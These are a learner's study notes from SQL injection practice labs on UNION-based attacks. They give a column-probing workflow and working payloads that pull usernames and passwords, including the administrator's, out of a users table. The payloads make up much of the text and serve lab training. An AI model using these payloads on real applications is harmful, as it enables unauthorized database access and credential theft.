## SQLi UNION attacks - labs 2, 3, 4

### what i learned
UNION attacks let you staple a second query onto the original
and dump results onto the page as if they were normal content.

### the standard workflow every time
1. find column count - probe NULLs until no error
   ' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--  
   ' UNION SELECT NULL,NULL,NULL--  ← loads = this many columns

2. find text-compatible column - swap one NULL for 'a' at a time
   ' UNION SELECT 'a',NULL--
   ' UNION SELECT NULL,'a'--  ← no error = this column accepts text

3. extract data
   ' UNION SELECT NULL,username||'~'||password FROM users--

### key things to remember
- NULL is compatible with any type, use it to pad unused columns
- comma approach when 2 text columns available: SELECT username,password
- concatenation when only 1 text column: username||'~'||password
- without concatenation you lose the pairing - passwords with no username = useless
- ' closes the original string, -- comments out the rest
- quotes inside payload can conflict, URL encode them as %27 if needed
- SELECT doesn't need a table if returning literal values ('a', NULL, 1+1)
- Oracle needs FROM dual even for literal selects

### payloads that worked
' UNION SELECT NULL,'a',NULL--  (text in column 2)
' UNION SELECT NULL,username||'~'||password FROM users--
' UNION SELECT username,password FROM users WHERE username='administrator'--
